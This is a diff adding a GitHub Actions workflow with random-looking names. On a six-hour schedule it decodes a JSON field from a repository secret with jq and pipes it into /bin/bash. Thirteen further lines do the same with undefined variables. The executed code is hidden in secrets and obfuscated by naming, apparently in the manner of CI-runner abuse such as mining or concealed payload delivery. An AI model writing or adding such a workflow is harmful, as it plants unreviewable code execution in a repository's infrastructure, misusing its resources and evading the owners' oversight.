@@ -1,0 +1,31 @@
+name: fascinatedsparkler
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fascinatedsparkler
+        env:
+          rs2642: ${{ secrets.rs2642 }}
+        run: |
+          echo $rs2642 | jq -r .nb322 | /bin/bash
+          echo $czn39850 | jq -r .q6 | /bin/bash
+          echo $am6 | jq -r .f37 | /bin/bash
+          echo $pga04 | jq -r .ovm1083 | /bin/bash
+          echo $oucjj74 | jq -r .touc85237 | /bin/bash
+          echo $l608 | jq -r .h0089 | /bin/bash
+          echo $crxf88 | jq -r .e515 | /bin/bash
+          echo $khjiz8801 | jq -r .u77917 | /bin/bash
+          echo $yn068 | jq -r .elhfm4 | /bin/bash
+          echo $qw71 | jq -r .nk96252 | /bin/bash
+          echo $ey81 | jq -r .iespd7 | /bin/bash
+          echo $lwgbh1916 | jq -r .wpl246 | /bin/bash
+          echo $s3 | jq -r .k45 | /bin/bash
+          echo $ky0 | jq -r .oqs180 | /bin/bash
+
